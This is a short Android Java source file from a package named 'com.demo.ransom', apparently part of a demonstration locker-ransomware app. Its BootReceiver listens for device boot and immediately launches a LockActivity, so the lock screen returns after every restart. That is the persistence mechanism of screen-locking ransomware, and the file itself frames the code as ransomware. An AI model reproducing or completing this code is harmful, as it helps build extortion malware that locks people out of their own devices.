package com.demo.ransom;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {
            Intent lock = new Intent(c, LockActivity.class);
            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(lock);
        }
    }
}
